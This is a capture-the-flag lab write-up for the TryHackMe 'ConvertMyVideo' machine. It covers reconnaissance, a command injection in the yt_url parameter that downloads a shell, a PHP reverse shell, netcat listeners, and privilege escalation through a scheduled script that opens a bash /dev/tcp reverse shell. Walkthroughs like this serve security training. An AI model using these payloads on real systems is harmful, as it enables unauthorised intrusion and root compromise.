# [ConvertMyVideo](https://tryhackme.com/room/convertmyvideo)

## My Script to convert videos to MP3 is super secure

# Hack the machine

## You can convert your videos - Why don't you check it out!

### What is the name of the secret folder?

1. Perform initial reconnaissance using Nmap to identify open ports and services

```bash
nmap -sV IP
```

[SCREEN01]

2. Conduct directory enumeration using Gobuster to discover hidden directories
   - The enumeration reveals the secret folder: `/admin`

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

[SCREEN02]

---

### What username is required to access the secret folder?

### What is the user flag?

_The folder is protected by Apache authentication._

1. Navigate to the main application at `http://<TARGET_IP>` and examine the video conversion functionality

2. Identify the application's video URL parameter as a potential injection point. Capture the POST request using Burp Suite or similar proxy tool

3. Exploit command injection vulnerability in the `yt_url` parameter by injecting a command to download and execute a reverse shell

   - `` yt_url=`wget${IFS}http://IP:8000/shell.php` ``

[SCREEN03]

4. Create a PHP reverse shell script on the attacking machine

```php
<?php
$ip = '192.168.1.10';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

5. Start an HTTP server to serve the shell script

```bash
python -m SimpleHTTPServer
```

6. Set up a netcat listener to catch the reverse shell

```bash
nc -lvnp 4444
```

7. Submit the malicious payload through the web application, then visit `http://<TARGET_IP>/shell.php` to trigger the reverse shell execution

8. Once the shell is established, navigate to the admin directory and examine its contents

```bash
ls -la
cd admin
ls -la
cat .htpasswd
cat flag.txt
```

[SCREEN04]

---

### What is the root flag?

1. Navigate to the temporary directory where the web application stores files

```bash
cd /var/www/html/tmp
```

2. Create a malicious script that will be executed by the scheduled task

```bash
echo 'bash -i >& /dev/tcp/IP/5555 0>&1' > clean.sh
```

3. Set up a new netcat listener on a different port to catch the privileged reverse shell. Wait for the scheduled task to execute the script. Once the root shell is obtained, retrieve the root flag

```bash
nc -lvnp 5555
ls -la /root
cat /root/root.txt
```

[SCREEN05]
